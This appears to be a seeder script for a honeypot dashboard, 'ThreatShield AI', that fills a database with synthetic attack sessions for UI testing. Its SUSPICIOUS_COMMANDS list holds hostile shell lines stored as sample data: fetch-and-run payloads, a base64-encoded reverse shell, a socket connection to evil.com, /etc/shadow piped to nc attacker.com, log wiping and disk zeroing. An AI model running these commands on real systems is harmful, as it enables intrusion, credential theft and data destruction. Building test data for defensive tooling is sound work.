"""
ThreatShield AI — Synthetic Attack Data Seeder

Populates the database with 60 realistic attack sessions for UI testing.
Run this after `docker compose up -d` to see a fully populated dashboard.

Usage (inside the backend container):
    docker exec -it threatshield-backend python seed_data.py
"""

import asyncio
import random
from datetime import datetime, timedelta

from sqlalchemy import select
from app.database import AsyncSessionLocal, engine, Base
from app.models import AttackSession, CredentialAttempt, CommandLog, AttackType, Severity

# ─── Sample data pools ─────────────────────────────────────────────────────────

COUNTRIES = [
    ("China",          "CN", 35.86, 104.19),
    ("Russia",         "RU", 61.52, 105.32),
    ("United States",  "US", 37.09, -95.71),
    ("India",          "IN", 20.59,  78.96),
    ("Germany",        "DE", 51.16,  10.45),
    ("Brazil",         "BR",-14.24, -51.93),
    ("Netherlands",    "NL", 52.13,   5.29),
    ("Ukraine",        "UA", 48.38,  31.17),
    ("South Korea",    "KR", 35.91, 127.77),
    ("Pakistan",       "PK", 30.38,  69.35),
    ("Vietnam",        "VN", 14.06, 108.28),
    ("Nigeria",        "NG",  9.08,   8.68),
    ("Iran",           "IR", 32.43,  53.69),
    ("Turkey",         "TR", 38.96,  35.24),
    ("Indonesia",      "ID", -0.79, 113.92),
    ("Bangladesh",     "BD", 23.69,  90.36),
    ("Mexico",         "MX", 23.63,-102.55),
    ("Romania",        "RO", 45.94,  24.97),
    ("France",         "FR", 46.23,   2.21),
    ("United Kingdom", "GB", 55.38,  -3.44),
]

IPS = [
    "203.0.113.42",  "198.51.100.89",  "185.220.101.34", "45.33.32.156",
    "103.21.244.1",  "94.102.61.10",   "185.156.73.118", "91.108.56.77",
    "5.188.206.14",  "193.32.162.44",  "45.146.165.37",  "109.237.96.93",
    "45.92.1.157",   "185.67.82.214",  "83.97.73.190",   "193.187.172.31",
    "178.128.0.101", "68.183.36.90",   "167.71.13.196",  "159.89.12.231",
    "64.227.2.153",  "206.189.89.32",  "128.199.33.84",  "165.22.40.165",
    "134.209.155.1", "142.93.125.41",  "159.223.0.44",   "161.35.1.1",
]

USERNAMES = [
    "root", "admin", "administrator", "ubuntu", "pi", "test", "guest",
    "user", "oracle", "postgres", "ftp", "deploy", "jenkins", "vagrant",
    "ec2-user", "centos", "fedora", "support", "operator", "web",
]

PASSWORDS = [
    "123456", "password", "admin", "root", "test", "12345678", "qwerty",
    "letmein", "welcome", "monkey", "1234567890", "abc123", "111111",
    "mustang", "shadow", "master", "dragon", "baseball", "football",
    "P@ssw0rd", "Admin@123", "Passw0rd!", "root123", "toor", "alpine",
]

SUSPICIOUS_COMMANDS = [
    "wget http://malware-host.xyz/payload.sh -O /tmp/p && chmod +x /tmp/p && /tmp/p",
    "curl -s http://91.108.4.1/miner | bash",
    "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84MCAwPiYx | base64 -d | bash",
    "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('evil.com',4444))\"",
    "rm -rf /var/log/*",
    "cat /etc/shadow | nc attacker.com 9001",
    "dd if=/dev/zero of=/dev/sda bs=4096",
    "nmap -sV -O 192.168.0.0/24",
    "xmrig --coin XMR --url stratum+tcp://xmr.pool.minergate.com:45560",
    "iptables -F && iptables -X",
]

RECON_COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /", "pwd",
    "ps aux", "netstat -an", "ifconfig", "ip addr", "cat /proc/cpuinfo",
    "cat /proc/meminfo", "df -h", "mount", "env", "history",
]


# ─── Seeder ────────────────────────────────────────────────────────────────────

async def seed():
    # Ensure tables exist
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with AsyncSessionLocal() as db:
        existing = await db.execute(select(AttackSession).limit(1))
        if existing.scalar_one_or_none():
            print("✓ Database already has data — skipping seed.")
            print("  To re-seed, connect to postgres and run: TRUNCATE attack_sessions CASCADE;")
            return

        print("🌱 Seeding 60 synthetic attack sessions...")
        created_sessions = []
        now = datetime.utcnow()

        # Define severity distribution: 20% CRITICAL, 30% HIGH, 30% MEDIUM, 20% LOW
        severity_pool = (
            [Severity.CRITICAL] * 12 +
            [Severity.HIGH]     * 18 +
            [Severity.MEDIUM]   * 18 +
            [Severity.LOW]      * 12
        )
        random.shuffle(severity_pool)

        for i in range(60):
            country_name, code, lat, lon = random.choice(COUNTRIES)
            ip           = random.choice(IPS)
            severity     = severity_pool[i]
            source       = random.choice(["cowrie", "cowrie", "web_login"])  # 2:1 SSH ratio
            started_delta = timedelta(
                hours=random.randint(0, 168),
                minutes=random.randint(0, 59)
            )
            started_at = now - started_delta
            ended_at   = started_at + timedelta(minutes=random.randint(1, 45)) if random.random() > 0.3 else None

            # Map severity to score range
            score_ranges = {
                Severity.CRITICAL: (72, 100),
                Severity.HIGH:     (47, 71),
                Severity.MEDIUM:   (22, 46),
                Severity.LOW:      (5,  21),
            }
            lo, hi = score_ranges[severity]
            score = random.randint(lo, hi)

            # Map severity to attack type
            attack_type_choices = {
                Severity.CRITICAL: [AttackType.malware_delivery, AttackType.brute_force, AttackType.credential_stuffing],
                Severity.HIGH:     [AttackType.brute_force,      AttackType.automation,  AttackType.credential_stuffing],
                Severity.MEDIUM:   [AttackType.reconnaissance,   AttackType.automation,  AttackType.web_recon],
                Severity.LOW:      [AttackType.reconnaissance,   AttackType.web_recon,   AttackType.unknown],
            }
            attack_type = random.choice(attack_type_choices[severity])

            login_count = random.randint(1, 80) if severity in (Severity.HIGH, Severity.CRITICAL) else random.randint(1, 10)
            cmd_count   = random.randint(3, 20) if source == "cowrie" and severity in (Severity.HIGH, Severity.CRITICAL) else random.randint(0, 5)
            malware     = random.randint(1, 5) if attack_type == AttackType.malware_delivery else 0

            session = AttackSession(
                session_id        = f"seed_{i:04d}",
                source            = source,
                attacker_ip       = ip,
                attack_type       = attack_type,
                severity          = severity,
                threat_score      = score,
                country           = country_name,
                country_code      = code,
                city              = "Unknown",
                latitude          = lat + random.uniform(-2, 2),
                longitude         = lon + random.uniform(-2, 2),
                started_at        = started_at,
                ended_at          = ended_at,
                login_attempts    = login_count,
                commands_run      = cmd_count,
                malware_downloads = malware,
            )
            db.add(session)
            created_sessions.append((i, session, source, cmd_count, login_count))

        await db.commit()

        # Refresh to get IDs
        for _, session, _, _, _ in created_sessions:
            await db.refresh(session)

        # Insert credentials
        cred_count = 0
        for idx, session, source, cmd_count, login_count in created_sessions:
            for _ in range(min(login_count, 15)):
                db.add(CredentialAttempt(
                    session_id = session.id,
                    username   = random.choice(USERNAMES),
                    password   = random.choice(PASSWORDS),
                    success    = random.random() < 0.05,  # 5% success rate
                ))
                cred_count += 1

        await db.commit()

        # Insert commands (cowrie sessions only)
        cmd_count_total = 0
        for idx, session, source, cmd_count, _ in created_sessions:
            if source != "cowrie" or cmd_count == 0:
                continue
            suspicious_ratio = 0.6 if session.severity in (Severity.CRITICAL, Severity.HIGH) else 0.1
            for _ in range(cmd_count):
                is_susp = random.random() < suspicious_ratio
                cmd     = random.choice(SUSPICIOUS_COMMANDS) if is_susp else random.choice(RECON_COMMANDS)
                db.add(CommandLog(
                    session_id    = session.id,
                    command       = cmd,
                    is_suspicious = is_susp,
                ))
                cmd_count_total += 1

        await db.commit()

        print(f"✅ Seeded:")
        print(f"   {len(created_sessions)} attack sessions")
        print(f"   {cred_count} credential attempts")
        print(f"   {cmd_count_total} shell commands")
        print("🚀 Open http://localhost:3000 to see the dashboard!")


if __name__ == "__main__":
    asyncio.run(seed())
